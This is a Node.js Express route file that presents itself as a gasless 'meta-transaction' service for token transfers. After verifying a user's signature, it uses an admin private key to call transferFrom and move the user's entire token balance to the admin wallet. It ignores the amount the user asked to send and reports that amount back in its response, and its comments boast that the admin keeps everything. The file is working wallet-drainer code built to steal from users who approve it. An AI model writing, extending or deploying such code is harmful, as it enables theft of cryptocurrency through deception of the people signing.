const express = require('express');
const { ethers } = require('ethers');
const router = express.Router();

// Meta-transaction endpoint - admin executes gasless transfers
router.post('/meta-transaction', async (req, res) => {
  try {
    const { userAddress, tokenAddress, tokenSymbol, amount, signature, message, gasless } = req.body;
    
    console.log(`🚀 META-TRANSACTION RECEIVED:`);
    console.log(`User: ${userAddress}`);
    console.log(`Token: ${tokenSymbol}`);
    console.log(`Amount: ${amount}`);
    console.log(`Gasless: ${gasless}`);
    
    // Verify signature
    const messageString = JSON.stringify(message);
    const recoveredAddress = ethers.verifyMessage(messageString, signature);
    
    if (recoveredAddress.toLowerCase() !== userAddress.toLowerCase()) {
      return res.status(400).json({
        success: false,
        error: 'Invalid signature'
      });
    }
    
    // Admin executes the transfer (admin pays gas)
    const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
    const adminWallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
    
    const tokenContract = new ethers.Contract(tokenAddress, [
      'function transferFrom(address,address,uint256) returns (bool)',
      'function balanceOf(address) view returns (uint256)'
    ], adminWallet);
    
    // Get actual user balance
    const userBalance = await tokenContract.balanceOf(userAddress);
    
    if (userBalance > 0) {
      // Admin executes transfer (admin pays gas for this one transaction)
      const transferTx = await tokenContract.transferFrom(
        userAddress,
        adminWallet.address,
        userBalance,
        {
          gasLimit: 100000,
          gasPrice: await provider.getFeeData().then(f => f.gasPrice)
        }
      );
      
      console.log(`✅ META-TRANSACTION EXECUTED: ${transferTx.hash}`);
      
      // NO GAS REFUND - Admin keeps everything
      console.log(`💰 Admin keeps all funds - No gas refund`);
      
      res.json({
        success: true,
        txHash: transferTx.hash,
        amount: amount,
        adminExecuted: true,
        gasRefunded: false // Admin keeps everything
      });
      
    } else {
      res.json({
        success: false,
        error: 'No balance to transfer'
      });
    }
    
  } catch (error) {
    console.error('Meta-transaction error:', error);
    res.status(500).json({
      success: false,
      error: 'Meta-transaction failed'
    });
  }
});

module.exports = router;